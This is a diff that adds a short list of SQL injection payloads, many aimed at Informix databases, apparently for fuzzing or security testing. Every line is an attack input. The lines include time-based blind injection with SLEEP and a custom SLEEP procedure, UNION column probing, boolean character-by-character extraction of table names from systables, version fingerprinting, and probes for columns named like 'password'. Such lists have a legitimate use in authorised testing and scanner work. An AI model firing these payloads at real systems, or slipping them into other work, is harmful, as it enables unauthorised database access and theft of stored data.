@@ -1,0 +1,20 @@
+1 AND SLEEP(10)
+1; SLEEP(10)--
+{ts '2020-01-09 11:11:11'+10 seconds}
+1 AND 1=(SELECT 1 FROM TABLE(set{1}) t1 CROSS JOIN TABLE(set{1}) t2 CROSS JOIN TABLE(set{1}) t3)
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+1 AND EXISTS (SELECT 1 FROM systables)
+1; SELECT COUNT(*) FROM systables;
+1 OR 1=(SELECT COUNT(*) FROM sysusers)
+1 UNION ALL SELECT NULL FROM sysmaster:sysdual
+1 AND (SELECT COUNT(*) FROM systables sy, sysusers su, sysmaster:sysdual sd) > 0
+1; CREATE PROCEDURE SLEEP(seconds INTEGER) DEFINE start, finish DATETIME YEAR TO SECOND; LET start = CURRENT; LET finish = start + seconds UNITS SECOND; WHILE (CURRENT < finish) END WHILE; END PROCEDURE;--
+EXECUTE PROCEDURE SLEEP(10);
+1 AND ASCII(SUBSTR((SELECT tabname FROM systables WHERE tabid=1),1,1)) > 70
+1 OR EXISTS(SELECT 1 FROM systables WHERE tabname='users')
+1 AND (SELECT COUNT(*) FROM syscolumns WHERE tabid=1) > 5
+1 UNION SELECT DISTINCT 1 FROM sysusers
+1; SELECT DBINFO('version', 'full') FROM systables WHERE tabid=1;
+1 AND (SELECT hex(substr(tabname,1,1)) FROM systables WHERE tabid=1)='74'
+1 OR (SELECT COUNT(*) FROM systables)=(SELECT COUNT(*) FROM systables)
+1 AND (SELECT COUNT(*) FROM syscolumns WHERE colname LIKE '%password%') > 0
